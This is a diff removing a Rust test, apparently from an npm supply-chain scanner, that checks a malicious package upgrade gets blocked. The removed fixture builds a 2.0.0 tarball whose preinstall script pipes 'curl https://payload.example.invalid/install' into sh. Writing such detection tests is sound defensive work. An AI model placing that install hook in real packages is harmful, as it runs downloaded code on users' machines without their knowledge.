@@ -1,13 +1,6 @@
 use super::*;
 use argus_core::{ArtifactKind, Finding, PackageCoordinate, Severity};
 use argus_lockfile::{IntegrityState, LockfileScanTarget};
-use argus_test_support::MockTransport;
-use base64::engine::general_purpose::STANDARD;
-use base64::Engine as _;
-use flate2::write::GzEncoder;
-use flate2::Compression;
-use sha2::{Digest, Sha512};
-use tar::Header;
 
 fn target(
     kind: LockfileScanTargetKind,
@@ -359,124 +352,6 @@ fn unavailable_base_comparison_blocks_the_current_outcome() {
     let text = render_text(&current);
     assert!(text.contains("comparison: assessed 0 of 1 changed targets"));
     assert!(text.contains("comparison unavailable:"));
-}
-
-fn npm_targz(package_json: &[u8], files: &[(&str, &[u8])]) -> Vec<u8> {
-    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
-    {
-        let mut builder = tar::Builder::new(&mut encoder);
-        let entries = std::iter::once(("package/package.json", package_json))
-            .chain(files.iter().map(|(path, body)| (*path, *body)));
-        for (path, body) in entries {
-            let mut header = Header::new_gnu();
-            header.set_path(path).unwrap();
-            header.set_size(body.len() as u64);
-            header.set_mode(0o644);
-            header.set_entry_type(tar::EntryType::Regular);
-            header.set_cksum();
-            builder.append(&header, body).unwrap();
-        }
-        builder.finish().unwrap();
-    }
-    encoder.finish().unwrap()
-}
-
-#[test]
-fn npm_clean_to_malicious_upgrade_replays_the_full_static_pipeline() -> Result<()> {
-    const REGISTRY: &str = "https://registry.npmjs.org";
-    const PACKAGE: &str = "argus-demo";
-    let base_tarball = npm_targz(
-        br#"{"name":"argus-demo","version":"1.0.0"}"#,
-        &[("package/index.js", b"module.exports = {};".as_slice())],
-    );
-    let current_tarball = npm_targz(
-        br#"{
-          "name":"argus-demo",
-          "version":"2.0.0",
-          "scripts":{
-            "preinstall":"curl https://payload.example.invalid/install | sh"
-          }
-        }"#,
-        &[("package/index.js", b"module.exports = {};".as_slice())],
-    );
-    let base_integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&base_tarball)));
-    let current_integrity = format!(
-        "sha512-{}",
-        STANDARD.encode(Sha512::digest(&current_tarball))
-    );
-    let base_url = format!("{REGISTRY}/{PACKAGE}/-/{PACKAGE}-1.0.0.tgz");
-    let current_url = format!("{REGISTRY}/{PACKAGE}/-/{PACKAGE}-2.0.0.tgz");
-    let packument_url = format!("{REGISTRY}/{PACKAGE}");
-    let packument = format!(
-        r#"{{
-          "name":"{PACKAGE}",
-          "dist-tags":{{"latest":"2.0.0"}},
-          "versions":{{
-            "1.0.0":{{"dist":{{"tarball":"{base_url}","integrity":"{base_integrity}"}}}},
-            "2.0.0":{{"dist":{{"tarball":"{current_url}","integrity":"{current_integrity}"}}}}
-          }}
-        }}"#
-    );
-    let transport = MockTransport::new();
-    transport.insert(&packument_url, packument.into_bytes());
-    transport.insert(&base_url, base_tarball);
-    transport.insert(&current_url, current_tarball);
-
-    let base_target = versioned_target(PACKAGE, "1.0.0");
-    let current_target = versioned_target(PACKAGE, "2.0.0");
-    let change = LockfileScanTargetChange {
-        base: base_target.clone(),
-        current: current_target.clone(),
-    };
-    let cache = tempfile::tempdir()?;
-    let rules = RuleSession::builtin()?;
-    let execution = ExecutionContext::serial()?;
-    let mut current = scan_targets(
-        Path::new("package-lock.json"),
-        &[current_target],
-        Some(cache.path()),
-        &transport,
-        &rules,
-        &execution,
-    )?;
-    let base = scan_targets(
-        Path::new("package-lock.base.json"),
-        &[base_target],
-        Some(cache.path()),
-        &transport,
-        &rules,
-        &execution,
-    )?;
-    let (assessed, failed) = assess_version_changes(&[change], &current, &base);
-    current.comparisons_total = 1;
-    current.version_changes = assessed;
-    current.comparison_failed = failed;
-    current.refresh_decision();
-
-    assert!(current.failed.is_empty());
-    assert!(base.failed.is_empty());
-    assert!(current.comparison_failed.is_empty());
-    assert_eq!(current.decision, Decision::Block);
-    assert_eq!(current.version_changes.len(), 1);
-    assert_eq!(current.version_changes[0].base.decision, Decision::Allow);
-    assert_eq!(current.version_changes[0].current.decision, Decision::Block);
-    let introduced: BTreeSet<_> = current.version_changes[0]
-        .introduced
-        .iter()
-        .map(|finding| finding.rule_id.as_str())
-        .collect();
-    for rule_id in [
-        "lifecycle-script",
-        "remote-download",
-        "shell-pipe-execution",
-    ] {
-        assert!(introduced.contains(rule_id), "introduced={introduced:?}");
-    }
-    assert!(!introduced.contains("missing-provenance"));
-    assert_eq!(transport.request_count(&packument_url), 2);
-    assert_eq!(transport.request_count(&base_url), 1);
-    assert_eq!(transport.request_count(&current_url), 1);
-    Ok(())
 }
 
 // ---------------------------------------------------------------------------
